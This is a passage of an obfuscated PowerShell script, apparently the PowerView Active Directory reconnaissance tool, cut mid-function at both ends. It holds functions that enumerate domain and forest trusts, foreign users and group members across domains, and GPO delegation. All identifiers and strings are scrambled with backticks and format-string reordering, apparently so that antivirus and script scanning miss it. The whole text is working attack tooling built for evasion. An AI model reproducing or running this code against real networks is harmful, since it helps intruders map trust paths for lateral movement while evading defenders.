                        ${DOMAi`N`Tru`St} | &("{2}{1}{3}{0}"-f 'r','e','Add-M','mbe') ("{2}{0}{1}" -f'tep','roperty','No') ("{1}{3}{2}{0}"-f 'ributes','Tru','Att','st') ${I`NfO}."t`R`U`StatTriB`UteS"
                        ${Do`maInTR`UST} | &("{2}{1}{0}"-f'mber','-Me','Add') ("{1}{3}{2}{0}"-f 'operty','Not','pr','e') ("{0}{1}" -f'Ta','rgetSid') ${SIdsT`R`INg}
                        ${DO`MAiNTr`UST} | &("{2}{1}{0}" -f 'mber','d-Me','Ad') ("{1}{2}{0}"-f'ty','Notep','roper') ("{1}{2}{0}"-f'rgetGuid','T','a') ${I`NFO}."dOM`AiNg`UiD"
                        ${dOm`AI`N`TRuST}."Ps`OBJ`eCT"."TYp`EnaM`eS".("{0}{2}{1}" -f'In','ert','s').Invoke(0, ("{1}{0}{2}{4}{6}{3}{5}"-f'ew.Doma','PowerVi','i','st','nTr','.API','u'))
                        ${dO`MAiNtru`St}
                    }
                }
                
                ${n`ULL} = ${N`e`TapI32}::("{3}{0}{2}{1}" -f'ff','e','erFre','NetApiBu').Invoke(${p`TRin`FO})
            }
            else {
                &("{1}{2}{0}{3}" -f 'Verbos','Wri','te-','e') "[Get-DomainTrust] Error: $(([ComponentModel.Win32Exception] $Result).Message) "
            }
        }
        else {
            
            ${foU`Ndd`OMaIn} = &("{2}{1}{0}" -f 'n','-Domai','Get') @NetSearcherArguments
            if (${FOuN`Dd`O`maiN}) {
                ${fOUn`dDom`A`in}.("{6}{4}{3}{5}{7}{1}{2}{0}"-f 's','on','ship','us','lTr','t','GetAl','Relati').Invoke() | &("{1}{3}{4}{0}{2}" -f'ec','ForEa','t','ch-','Obj') {
                    ${_}."PSobj`eCt"."TypeN`A`mEs".("{0}{1}" -f'I','nsert').Invoke(0, ("{5}{2}{3}{4}{6}{1}{0}" -f'ET','inTrust.N','owerVi','ew','.Dom','P','a'))
                    ${_}
                }
            }
        }
    }
}


function ge`T`-f`Or`EsTTrusT {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{0}{1}{3}"-f'u','ldPro','PSSho','cess'}, '')]
    [OutputType({"{5}{0}{6}{4}{3}{1}{2}" -f'owerVie','E','T','estTrust.N','or','P','w.F'})]
    [CmdletBinding()]
    Param(
        [Parameter(pOsiTioN = 0, vALuefRompIpelInE = ${T`RuE}, VaLUEFROmpiPeLiNebYPrOPERTYNAMe = ${TR`Ue})]
        [Alias({"{0}{1}"-f'N','ame'})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${fO`Re`sT},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cREdENt`i`AL} =   ( geT-vAriAbLE ("7t"+"Q02")  )."v`ALuE"::"emp`TY"
    )

    PROCESS {
        ${netfo`Re`s`T`ARguMENts} = @{}
        if (${PSbouNDp`ArAM`Ete`Rs}[("{0}{2}{1}"-f 'F','t','ores')]) { ${N`Etf`ORE`STaR`gUMen`Ts}[("{1}{2}{0}" -f 'est','F','or')] = ${f`Ore`st} }
        if (${PsbO`Un`DP`A`RaM`eTErs}[("{2}{0}{1}" -f'd','ential','Cre')]) { ${N`EtFOReSTAr`G`UME`N`TS}[("{1}{0}{2}"-f 'redentia','C','l')] = ${c`RE`D`EntiAl} }

        ${FOuN`dF`oREST} = &("{1}{2}{0}" -f 'rest','Get-','Fo') @NetForestArguments

        if (${fOu`NDfor`eSt}) {
            ${FOuNDF`o`REst}.("{2}{0}{3}{1}{4}"-f'etAllTrustRelationsh','p','G','i','s').Invoke() | &("{3}{4}{0}{2}{1}" -f'r','ch-Object','Ea','F','o') {
                ${_}."pSO`B`JEct"."TY`P`eNa`mES".("{1}{0}" -f'sert','In').Invoke(0, ("{0}{3}{1}{5}{2}{4}" -f 'PowerV','st','rust.N','iew.Fore','ET','T'))
                ${_}
            }
        }
    }
}


function gEt-Doma`iNfo`RE`iGNUS`eR {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{2}{0}{1}"-f'd','Process','l','PSShou'}, '')]
    [OutputType({"{2}{1}{4}{3}{0}"-f 'er','owerVi','P','w.ForeignUs','e'})]
    [CmdletBinding()]
    Param(
        [Parameter(POsItion = 0, vALUEFROMPIPelINe = ${tr`UE}, VaLUefROmpIPELINeBypropErtYnaME = ${t`RUE})]
        [Alias({"{1}{0}" -f'ame','N'})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${d`oMAiN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f 'Fil','ter'})]
        [String]
        ${L`dApFI`LTER},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${P`R`OpeR`TiEs},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{0}{1}" -f 'DSPa','th','A'})]
        [String]
        ${S`eaR`ChbA`Se},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{2}{3}{5}{4}" -f 'nCont','Domai','rol','l','r','e'})]
        [String]
        ${SerV`eR},

        [ValidateSet({"{1}{0}" -f 'ase','B'}, {"{0}{2}{1}" -f'OneLev','l','e'}, {"{1}{0}{2}"-f 'b','Su','tree'})]
        [String]
        ${s`EA`RcH`SCopE} = ("{0}{2}{1}"-f 'Sub','ee','tr'),

        [ValidateRange(1, 10000)]
        [Int]
        ${RE`sultpAgeS`i`ZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SeRveRt`Im`E`lIMIT},

        [ValidateSet({"{0}{1}" -f'D','acl'}, {"{0}{1}"-f'Gro','up'}, {"{1}{0}"-f'e','Non'}, {"{1}{0}" -f 'r','Owne'}, {"{0}{1}"-f 'Sa','cl'})]
        [String]
        ${sec`UrIt`ym`As`KS},

        [Switch]
        ${t`OMb`stOne},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CreD`enT`IAl} =  (  gCI ("varIAble"+":7tQ0"+"2") )."vA`Lue"::"eM`PTY"
    )

    BEGIN {
        ${s`eARChErAr`GUme`N`TS} = @{}
        ${seA`RCH`E`Ra`RgUMe`NtS}[("{2}{0}{3}{1}" -f 'DAPF','er','L','ilt')] = ("{0}{1}{2}"-f '(m','embero','f=*)')
        if (${psbO`U`NdPArAM`ETE`Rs}[("{0}{1}" -f'Do','main')]) { ${se`ARCheraRgUM`en`TS}[("{0}{1}"-f 'D','omain')] = ${d`oMa`IN} }
        if (${Psbo`Undp`Ara`Me`TeRS}[("{1}{0}{3}{2}"-f 'perti','Pro','s','e')]) { ${sE`ArChEr`Argum`en`TS}[("{2}{3}{0}{1}"-f 'rti','es','Prop','e')] = ${PR`op`erTIeS} }
        if (${pSb`O`U`NDP`ARA`MEteRS}[("{2}{0}{1}"-f'as','e','SearchB')]) { ${sEa`R`C`her`ArguMeN`TS}[("{1}{0}{2}"-f 'hBas','Searc','e')] = ${Sea`R`cHB`ASe} }
        if (${P`SbOuN`dPAR`Am`EtErS}[("{0}{1}"-f'Ser','ver')]) { ${s`EarCHerargU`M`eNTS}[("{0}{1}" -f 'Se','rver')] = ${Ser`V`Er} }
        if (${PsBo`UndP`ARaM`eT`erS}[("{1}{0}{2}"-f 'cop','SearchS','e')]) { ${S`EA`RC`hErA`RgumE`Nts}[("{2}{0}{1}" -f 'arch','Scope','Se')] = ${SEA`RChsco`PE} }
        if (${PSb`Ou`Nd`pArAmET`eRs}[("{3}{0}{1}{2}"-f 'age','Siz','e','ResultP')]) { ${seA`R`cheR`ARGu`mENts}[("{2}{0}{1}" -f'eS','ize','ResultPag')] = ${R`e`SU`lTpaGEsIze} }
        if (${PS`BoUN`dpaR`AmETErS}[("{2}{1}{0}"-f'Limit','Time','Server')]) { ${SE`ARcheRaRg`UMe`N`TS}[("{0}{2}{3}{1}"-f'ServerTim','it','eL','im')] = ${SErvER`TimEl`IM`iT} }
        if (${P`SBOUnDPaR`AmEte`RS}[("{1}{0}{2}" -f 'rityMas','Secu','ks')]) { ${s`Ear`ch`ERARg`UmE`Nts}[("{0}{3}{2}{1}" -f'Securit','asks','M','y')] = ${seCU`RITym`A`s`KS} }
        if (${P`SBOu`Ndpa`RAMete`RS}[("{2}{1}{0}" -f 'one','mbst','To')]) { ${SEAr`Ch`ERaRGUm`En`TS}[("{1}{2}{0}"-f 'ne','To','mbsto')] = ${TomBst`o`NE} }
        if (${P`sbo`U`NdpaRAmeTeRS}[("{3}{2}{1}{0}" -f'l','ia','nt','Crede')]) { ${sEAr`ch`E`RArGuMe`Nts}[("{0}{2}{1}" -f 'Cr','ential','ed')] = ${cr`ED`e`NtIal} }
        if (${psB`OUNd`Par`AMetE`Rs}['Raw']) { ${S`Ea`RCH`ERaRGUMeNts}['Raw'] = ${r`AW} }
    }

    PROCESS {
        &("{4}{3}{0}{1}{2}"-f'm','ainUs','er','o','Get-D') @SearcherArguments  | &("{1}{3}{0}{2}"-f'jec','ForE','t','ach-Ob') {
            ForEach (${m`EmBE`RSHip} in ${_}."ME`MBE`ROf") {
                ${in`dEX} = ${meMbe`RsH`IP}.("{0}{1}" -f 'In','dexOf').Invoke('DC=')
                if (${IN`dex}) {

                    ${GRo`UPd`oMaiN} = $(${M`em`BerSHIp}.("{1}{0}{2}"-f'bStrin','Su','g').Invoke(${InD`EX})) -replace 'DC=','' -replace ',','.'
                    ${US`eRD`IsTi`N`gui`SHEdn`AME} = ${_}."DIS`TiNg`U`I`sHe`DnaMe"
                    ${USEr`IN`d`eX} = ${u`seRDi`stIng`UishEdn`AME}.("{1}{0}"-f'dexOf','In').Invoke('DC=')
                    ${usE`R`DoM`AIN} = $(${_}."diST`InG`Ui`S`HEDNAME".("{1}{0}{2}" -f'ubStrin','S','g').Invoke(${uS`E`RIndEx})) -replace 'DC=','' -replace ',','.'

                    if (${grO`Up`dOma`iN} -ne ${usERdom`A`IN}) {
                        
                        ${GrO`U`p`NAMe} = ${mE`mb`erSH`ip}.("{0}{1}" -f'Spli','t').Invoke(',')[0].("{0}{1}" -f 'spl','it').Invoke('=')[1]
                        ${FO`Rei`gN`User} = &("{0}{2}{1}" -f 'N','ect','ew-Obj') ("{1}{0}{2}" -f 'Obje','PS','ct')
                        ${for`e`ignUsER} | &("{2}{0}{1}"-f 'd-Mem','ber','Ad') ("{2}{0}{1}"-f 'o','perty','Notepr') ("{1}{0}{2}" -f'Domai','User','n') ${UsEr`Do`M`AIn}
                        ${fo`Re`Ig`NUSEr} | &("{2}{1}{0}"-f'mber','Me','Add-') ("{0}{3}{1}{2}" -f'Notep','t','y','roper') ("{2}{0}{1}"-f'am','e','UserN') ${_}."s`AMa`cc`OUn`TnaME"
                        ${F`OReIG`NuSer} | &("{1}{2}{0}"-f 'ber','A','dd-Mem') ("{0}{2}{3}{1}"-f 'Not','ty','epr','oper') ("{0}{5}{2}{3}{4}{1}" -f 'UserDi','Name','ti','nguish','ed','s') ${_}."diSting`UI`sH`e`dnAme"
                        ${F`ORe`ig`NUSer} | &("{1}{2}{0}"-f 'er','A','dd-Memb') ("{1}{0}{2}"-f'rt','Noteprope','y') ("{1}{0}{3}{2}" -f 'Do','Group','in','ma') ${grou`Pd`OMa`IN}
                        ${for`eig`Nu`sEr} | &("{3}{0}{1}{2}" -f'd-M','em','ber','Ad') ("{1}{0}{2}"-f'prop','Note','erty') ("{0}{1}{3}{2}" -f 'Gr','o','ame','upN') ${g`R`OUpNAMe}
                        ${F`O`ReIGnUs`ER} | &("{0}{2}{1}" -f'Add','er','-Memb') ("{2}{0}{1}"-f 'ep','roperty','Not') ("{0}{3}{2}{1}{4}"-f'G','uishe','isting','roupD','dName') ${M`eM`BER`ShiP}
                        ${fOre`IG`N`USeR}."Ps`oBj`ect"."TY`pE`NAMEs".("{0}{1}"-f'In','sert').Invoke(0, ("{2}{4}{1}{5}{0}{3}" -f 'reignU','rVi','Po','ser','we','ew.Fo'))
                        ${fOre`I`Gn`UsEr}
                    }
                }
            }
        }
    }
}


function ge`T-dOmA`IN`FoREiG`N`GroupmemBeR {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{2}{1}{0}" -f 's','oces','ouldPr','PSSh'}, '')]
    [OutputType({"{4}{0}{3}{2}{1}"-f 'Vie','upMember','oreignGro','w.F','Power'})]
    [CmdletBinding()]
    Param(
        [Parameter(POSiTIon = 0, ValUefRoMpIPElIne = ${T`Rue}, vaLueFROMPIpELInEByproPErtYNaMe = ${tR`Ue})]
        [Alias({"{1}{0}" -f'me','Na'})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${DO`maIN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}"-f'er','Filt'})]
        [String]
        ${lD`A`PFIl`TEr},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${pROP`eRTi`ES},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}" -f'ath','ADSP'})]
        [String]
        ${s`Ea`RChBaSe},

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{1}{2}{0}"-f'r','omain','Controlle','D'})]
        [String]
        ${SEr`VER},

        [ValidateSet({"{0}{1}" -f'B','ase'}, {"{0}{2}{1}" -f 'On','evel','eL'}, {"{0}{2}{1}" -f'Sub','e','tre'})]
        [String]
        ${seARc`h`SCOPe} = ("{1}{0}{2}"-f'e','Subtr','e'),

        [ValidateRange(1, 10000)]
        [Int]
        ${resultpA`g`ESi`ze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SERv`E`RTi`mElim`It},

        [ValidateSet({"{1}{0}"-f'cl','Da'}, {"{0}{1}" -f 'Gro','up'}, {"{0}{1}" -f 'Non','e'}, {"{1}{0}"-f 'ner','Ow'}, {"{1}{0}" -f 'l','Sac'})]
        [String]
        ${SEC`URi`T`YmAS`KS},

        [Switch]
        ${toM`B`SToNE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`ReDe`NtiAL} =  (ITem ("{1}{2}{3}{0}{4}" -f 'b','V','Ar','Ia','lE:7tq02')  )."VAL`Ue"::"eMP`Ty"
    )

    BEGIN {
        ${sEa`RCHEra`RgU`MEN`Ts} = @{}
        ${S`EArC`H`ErArGUmenTs}[("{0}{1}{2}"-f 'LDAPFi','l','ter')] = ("{0}{2}{1}" -f'(memb','*)','er=')
        if (${psBouNdPaRAM`et`E`Rs}[("{0}{1}"-f'Dom','ain')]) { ${s`E`ARc`hERArgum`eNTs}[("{1}{0}"-f 'in','Doma')] = ${D`OM`Ain} }
        if (${P`s`BoU`NdParaMETE`RS}[("{1}{2}{0}" -f'erties','P','rop')]) { ${s`E`ARch`eRaR`gUmEN`TS}[("{3}{0}{1}{2}" -f 'oper','t','ies','Pr')] = ${pr`oper`TiES} }
        if (${pSbOun`D`P`A`RaMEteRs}[("{2}{0}{1}" -f 'earch','Base','S')]) { ${se`AR`cHEr`ARgUmeN`Ts}[("{2}{1}{0}{3}"-f'archB','e','S','ase')] = ${sE`Arc`h`BaSe} }
        if (${PSB`ou`NDp`Aramete`RS}[("{1}{0}" -f'rver','Se')]) { ${SEaRCheRA`RG`UME`N`TS}[("{2}{0}{1}" -f'r','ver','Se')] = ${s`ERVEr} }
        if (${p`SBou`Ndp`AraMet`ErS}[("{1}{0}{2}" -f'arc','Se','hScope')]) { ${seA`RC`H`ERar`gUME`NtS}[("{1}{0}{2}" -f 'rchScop','Sea','e')] = ${s`e`A`RChscopE} }
        if (${ps`BOUnDpar`AMet`E`RS}[("{4}{0}{2}{1}{3}" -f 'u','tPage','l','Size','Res')]) { ${SeAR`Che`RA`Rg`UMeNTS}[("{2}{0}{3}{1}{4}"-f'esult','e','R','Pag','Size')] = ${RE`suLtPA`gES`IZe} }
        if (${PsB`OUnD`paR`A`MetERs}[("{1}{2}{3}{0}"-f 'mit','Ser','verTi','meLi')]) { ${S`EARCh`Er`A`RGu`mEnts}[("{2}{3}{1}{0}" -f 'imit','rTimeL','S','erve')] = ${SER`Ve`R`TI`melimIt} }
        if (${psB`oUnD`ParAm`ETe`Rs}[("{2}{0}{1}"-f 'curit','yMasks','Se')]) { ${S`eARC`he`RArguM`e`Nts}[("{0}{3}{4}{1}{2}" -f'Se','ityMas','ks','c','ur')] = ${SeC`U`R`ItymA`sks} }
        if (${p`sBOUN`DpaR`A`mete`Rs}[("{1}{2}{0}"-f 'one','Tomb','st')]) { ${se`A`Rc`HeRaRgu`menTs}[("{1}{2}{3}{0}" -f 'ne','T','omb','sto')] = ${To`M`BStone} }
        if (${pSBo`Un`dpAr`AmEtERS}[("{0}{2}{1}"-f'Cred','al','enti')]) { ${sEAR`C`h`ERArguM`e`Nts}[("{0}{2}{1}" -f 'Cr','al','edenti')] = ${cREDEN`T`iaL} }
        if (${pS`B`oUNDp`ARA`mETers}['Raw']) { ${SE`A`RCherArG`UmentS}['Raw'] = ${R`AW} }
    }

    PROCESS {
        
        ${EXcL`U`DegRo`UpS} = @(("{1}{0}" -f'sers','U'), ("{2}{1}{0}" -f's','in User','Doma'), ("{2}{0}{1}" -f 's','ts','Gue'))

        &("{3}{0}{2}{1}" -f '-Do','nGroup','mai','Get') @SearcherArguments | &("{0}{2}{3}{1}"-f'Where','ect','-','Obj') { ${e`XCLUD`e`GroU`pS} -notcontains ${_}."SaM`Acc`oUNt`NaMe" } | &("{0}{1}{2}"-f 'ForE','ach-Obje','ct') {
            ${gr`o`UpNamE} = ${_}."S`AmA`c`couNTnaMe"
            ${GRoUPd`ISTiN`Guishe`Dname} = ${_}."Di`STiNgU`Ish`EdNAMe"
            ${gr`OupDOMA`iN} = ${gROUp`DI`stin`G`UIS`hEdNAme}.("{0}{2}{1}"-f'SubSt','ng','ri').Invoke(${grO`UPDIsti`NguIS`HedNA`ME}.("{2}{0}{1}" -f'ndexO','f','I').Invoke('DC=')) -replace 'DC=','' -replace ',','.'

            ${_}."M`EmBEr" | &("{0}{1}{3}{2}"-f'For','E','t','ach-Objec') {
                
                
                ${mEmb`Erdo`mAIN} = ${_}.("{2}{1}{0}"-f'ng','tri','SubS').Invoke(${_}.("{0}{2}{1}" -f'Inde','Of','x').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                if ((${_} -match ("{2}{4}{1}{3}{0}"-f '1.*-.*','1-5-','CN','2','=S-')) -or (${gRO`U`pDomA`In} -ne ${Me`mB`ErD`omaIN})) {
                    ${MemBE`RdisTI`N`gUI`ShEDName} = ${_}
                    ${Me`MbEr`NAME} = ${_}.("{0}{1}" -f 'S','plit').Invoke(',')[0].("{1}{0}" -f't','spli').Invoke('=')[1]

                    ${FOR`eIgnG`RoupMEmb`ER} = &("{2}{1}{0}"-f'ect','ew-Obj','N') ("{0}{2}{1}"-f'PSO','ct','bje')
                    ${For`eI`gnGROU`P`MEMBer} | &("{1}{2}{0}"-f'r','A','dd-Membe') ("{3}{1}{2}{0}"-f 'operty','otep','r','N') ("{3}{2}{0}{1}" -f 'ou','pDomain','r','G') ${groupd`O`MAin}
                    ${fOre`IGNG`ROU`p`mEmb`Er} | &("{1}{2}{0}"-f 'mber','A','dd-Me') ("{2}{1}{0}"-f'property','ote','N') ("{1}{2}{0}"-f'Name','G','roup') ${g`ROup`NA`mE}
                    ${foRe`iG`NgROup`MEmbER} | &("{3}{1}{0}{2}"-f 'Me','dd-','mber','A') ("{3}{1}{2}{0}" -f'ty','o','teproper','N') ("{6}{3}{0}{5}{4}{1}{2}"-f 'D','sh','edName','oup','ingui','ist','Gr') ${GrOupD`IstIng`UIs`H`E`DnA`mE}
                    ${f`oreignGRo`UP`meMB`er} | &("{0}{1}{2}" -f 'Add-M','emb','er') ("{2}{1}{3}{0}" -f'operty','ote','N','pr') ("{2}{1}{0}" -f 'n','i','MemberDoma') ${MeMBe`R`DoMaiN}
                    ${forEIgN`GR`oUpmeMb`er} | &("{0}{1}{2}" -f'Add-Me','mb','er') ("{2}{0}{1}{3}"-f'e','pro','Not','perty') ("{2}{0}{1}"-f'rNa','me','Membe') ${mem`Be`RNAmE}
                    ${F`OReIgnGRO`U`P`ME`MBeR} | &("{2}{0}{1}" -f'dd-Me','mber','A') ("{2}{1}{0}{3}" -f't','per','Notepro','y') ("{0}{1}{2}{4}{3}{5}" -f 'MemberDistin','gui','sh','dNa','e','me') ${m`eMbe`RDI`sTINGu`isHe`DNa`ME}
                    ${fO`R`EI`Gn`groU`PmEmbEr}."pSObJ`E`ct"."tYpe`N`Ames".("{0}{1}" -f 'Ins','ert').Invoke(0, ("{7}{3}{2}{4}{1}{6}{5}{8}{0}" -f'ber','oreignG','ew','i','.F','M','roup','PowerV','em'))
                    ${fOreI`GNg`ROupm`EM`BEr}
                }
            }
        }
    }
}


function GET`-d`O`m`AinTrUSTmaPPiNG {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{0}{2}{1}" -f'SSh','rocess','ouldP','P'}, '')]
    [OutputType({"{4}{3}{6}{5}{1}{0}{2}" -f'ust.','r','NET','erV','Pow','inT','iew.Doma'})]
    [OutputType({"{3}{6}{5}{2}{0}{4}{1}" -f'Do','inTrust.LDAP','.','P','ma','werView','o'})]
    [OutputType({"{3}{4}{5}{6}{0}{2}{1}{7}" -f 'Tr','s','u','Powe','r','View.Domai','n','t.API'})]
    [CmdletBinding(DeFAultpaRAmETErSEtNaMe = {"{1}{0}"-f'DAP','L'})]
    Param(
        [Parameter(parAmeTersetnamE = 'API')]
        [Switch]
        ${a`pi},

        [Parameter(PArAmeTeRseTnAmE = 'NET')]
        [Switch]
        ${N`eT},

        [Parameter(pARamEtERseTNAmE = "Ld`Ap")]
        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}"-f'Filte','r'})]
        [String]
        ${l`DaP`F`iLtER},

        [Parameter(paraMeterSetname = "Ld`AP")]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${pROPE`Rt`iEs},

        [Parameter(pARAmEtERSEtnAme = "LD`AP")]
        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}"-f 'ADSPat','h'})]
        [String]
        ${sEar`Ch`BAsE},

        [Parameter(PArAMeTErSEtNaMe = "Ld`Ap")]
        [Parameter(PaRAmeTErsEtname = 'API')]
        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{3}{0}" -f 'r','Co','Domain','ntrolle'})]
        [String]
        ${s`ERV`er},

        [Parameter(PArAmetersEtNAmE = "l`dAp")]
        [ValidateSet({"{1}{0}"-f 'e','Bas'}, {"{2}{1}{0}"-f'evel','eL','On'}, {"{1}{2}{0}" -f 'btree','S','u'})]
        [String]
        ${sEa`RCH`ScOPE} = ("{0}{1}"-f 'Su','btree'),

        [Parameter(ParametersEtNaME = "l`daP")]
        [ValidateRange(1, 10000)]
        [Int]
        ${Re`Su`LTPaGe`s`iZe} = 200,

        [Parameter(PARamETeRsetNaME = "l`dAP")]
        [ValidateRange(1, 10000)]
        [Int]
        ${S`ER`VErtIM`eLi`MIT},

        [Parameter(PArAMetErSeTnAmE = "L`daP")]
        [Switch]
        ${tO`MBS`Tone},

        [Parameter(PArAmetERsetNamE = "ld`AP")]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`REDEnt`IAL} =   (VArIABLe  ("{1}{0}"-f'Q02','7t')  -VA )::"e`mPTy"
    )

    
    ${SeeNDO`M`AI`Ns} = @{}

    
    ${DO`maiNS} = &("{2}{3}{1}{0}" -f'ject','-Ob','N','ew') ("{2}{1}{3}{0}{4}"-f'tions.S','ys','S','tem.Collec','tack')

    ${DoM`AiNTRU`staRGu`M`EN`Ts} = @{}
    if (${P`sbOundPAram`ET`Ers}['API']) { ${doMa`INTru`sTA`RgU`mEntS}['API'] = ${a`Pi} }
    if (${psBoU`NDP`ARaMET`ERs}['NET']) { ${do`m`A`intRuSTaRGUme`N`Ts}['NET'] = ${n`Et} }
    if (${p`sbOu`NdParAme`TeRs}[("{2}{1}{0}"-f 'Filter','AP','LD')]) { ${DO`M`AInt`R`UST`A`RgUmEnTS}[("{1}{2}{0}" -f'er','LDAP','Filt')] = ${LDapFI`lT`eR} }
    if (${PSbo`UN`dpA`R`AMeTeRS}[("{2}{1}{0}" -f 's','pertie','Pro')]) { ${domAInTRUSt`ARGUMe`N`TS}[("{1}{0}{2}"-f 'e','Prop','rties')] = ${pR`Op`ertIeS} }
    if (${PsB`OUnD`pA`R`AmETErS}[("{2}{1}{0}{3}"-f'Ba','arch','Se','se')]) { ${dO`mai`NtruSt`ARg`UmE`NTS}[("{1}{0}{2}{3}" -f 'e','S','arch','Base')] = ${s`e`Ar`ChbaSe} }
    if (${pS`B`O`UndparaMeTE`RS}[("{2}{1}{0}"-f'ver','r','Se')]) { ${do`maIN`Tr`UstArGUM`enTS}[("{1}{0}" -f'ver','Ser')] = ${sER`Ver} }
    if (${PsBouN`dpAR`A`m`ETerS}[("{2}{3}{0}{1}" -f 'Scop','e','S','earch')]) { ${domAinT`RU`S`T`ARGuMen`TS}[("{3}{2}{1}{0}" -f 'cope','S','rch','Sea')] = ${seArC`hSc`OpE} }
    if (${psB`ouNDPARaM`E`Te`Rs}[("{2}{0}{1}{3}" -f 'ultPa','geS','Res','ize')]) { ${D`o`maIN`TrustA`Rg`Umen`Ts}[("{3}{0}{2}{1}"-f 'u','ze','ltPageSi','Res')] = ${rEsu`ltpaG`E`S`IZe} }
    if (${pSBO`Und`ParaM`e`Te`RS}[("{2}{4}{3}{0}{1}" -f 'L','imit','Serve','me','rTi')]) { ${d`o`ma`inTRU`s`TArGU`MenTs}[("{3}{0}{1}{2}" -f'erverT','imeLi','mit','S')] = ${seR`VerTi`M`ELim`IT} }
    if (${PSB`Ou`NDPaR`AMeteRS}[("{1}{0}{2}" -f'mbst','To','one')]) { ${dO`m`AiNtR`USTArGUM`eN`Ts}[("{2}{0}{1}" -f'n','e','Tombsto')] = ${t`om`BstonE} }
    if (${PSB`OuNDpar`AME`TeRs}[("{0}{1}{2}"-f'Cr','ed','ential')]) { ${Do`Ma`I`NtrU`sTa`RGUME`NtS}[("{0}{1}{2}"-f 'Cr','eden','tial')] = ${CrE`d`en`TiAL} }

    
    if (${ps`BOUnd`pa`Ra`mETeRs}[("{0}{2}{1}" -f 'Cre','tial','den')]) {
        ${Cu`RrE`N`TDo`maiN} = (&("{1}{0}{2}{3}" -f't-','Ge','D','omain') -Credential ${C`R`EDENT`iAl})."Na`ME"
    }
    else {
        ${cUR`RENT`dOmaIn} = (&("{3}{1}{2}{0}" -f'omain','et','-D','G'))."n`AmE"
    }
    ${dO`ma`INS}.("{0}{1}"-f 'Pu','sh').Invoke(${curREN`TD`O`M`AiN})

    while(${d`o`maINs}."CoU`Nt" -ne 0) {

        ${D`OM`AIn} = ${DO`Ma`INs}.("{0}{1}"-f 'P','op').Invoke()

        
        if (${DoM`AIn} -and (${DO`maIn}.("{0}{1}" -f'T','rim').Invoke() -ne '') -and (-not ${S`e`EnD`oMAiNs}.("{1}{0}{3}{2}"-f'ontains','C','y','Ke').Invoke(${D`oM`AiN}))) {

            &("{1}{0}{3}{2}"-f 'rite','W','ose','-Verb') ('['+'Get-Domain'+'Tr'+'us'+'tMa'+'p'+'pin'+'g] '+'E'+'numerat'+'ing'+' '+'tru'+'s'+'ts '+'fo'+'r '+'d'+'omai'+'n: '+"'$Domain'")

            
            ${nU`lL} = ${sE`EnDOM`AIns}.("{0}{1}"-f 'A','dd').Invoke(${doM`AiN}, '')

            try {
                
                ${DOmainTRU`sTArG`UmeN`Ts}[("{0}{2}{1}"-f'Dom','in','a')] = ${d`o`Main}
                ${Tr`U`stS} = &("{3}{4}{1}{2}{0}" -f 'ust','mainT','r','Ge','t-Do') @DomainTrustArguments

                if (${Tru`sTS} -isnot [System.Array]) {
                    ${tRUS`TS} = @(${tRU`s`Ts})
                }

                
                if (${pS`C`mD`Let}.paRaMETERSeTNAmE -eq 'NET') {
                    ${FO`R`EsTt`RU`StaRG`UmenTs} = @{}
                    if (${pSb`oU`Nd`pArAM`e`TErS}[("{0}{1}"-f 'Fo','rest')]) { ${fORestTr`USt`AR`g`UmEnts}[("{1}{0}" -f'st','Fore')] = ${fo`REsT} }
                    if (${pSBo`UN`Dp`ARAmeTErs}[("{3}{2}{1}{0}"-f'tial','n','ede','Cr')]) { ${FOr`EstTrU`staRG`Um`e`N`TS}[("{0}{1}{2}" -f'Cr','edentia','l')] = ${CR`ed`ENtiaL} }
                    ${tRU`S`TS} += &("{2}{3}{4}{0}{1}"-f 'tTrus','t','Ge','t-','Fores') @ForestTrustArguments
                }

                if (${t`Rus`Ts}) {
                    if (${t`R`UStS} -isnot [System.Array]) {
                        ${tRU`s`TS} = @(${T`R`USTs})
                    }

                    
                    ForEach (${TrU`sT} in ${tru`sts}) {
                        if (${Tr`Ust}."S`ouR`cenAmE" -and ${TR`U`st}."t`ARGet`NAme") {
                            
                            ${NU`Ll} = ${Do`m`AiNS}.("{1}{0}"-f'ush','P').Invoke(${T`Ru`st}."T`A`Rg`etName")
                            ${T`RusT}
                        }
                    }
                }
            }
            catch {
                &("{3}{1}{2}{0}" -f'e','ite-Verb','os','Wr') ('[Ge'+'t-D'+'om'+'ainTrust'+'Mapp'+'ing] '+'E'+'rror:'+' '+"$_")
            }
        }
    }
}


function gEt`-Gp`odE`LEGATion {


    [CmdletBinding()]
    Param (
        [String]
        ${GP`oName} = '*',

        [ValidateRange(1,10000)] 
        [Int]
        ${p`AgES`ize} = 200
    )

    ${ex`CL`USio`NS} = @(("{0}{2}{1}" -f 'SY','TEM','S'),("{1}{2}{0}"-f'ns','Dom','ain Admi'),("{0}{3}{2}{1}" -f'Ente','dmins','prise A','r'))

    ${FoR`Est} =   (VArIAble ("{0}{1}"-f'f','BG'))."vA`LUe"::("{0}{4}{3}{1}{2}"-f'G','ntFo','rest','rre','etCu').Invoke()
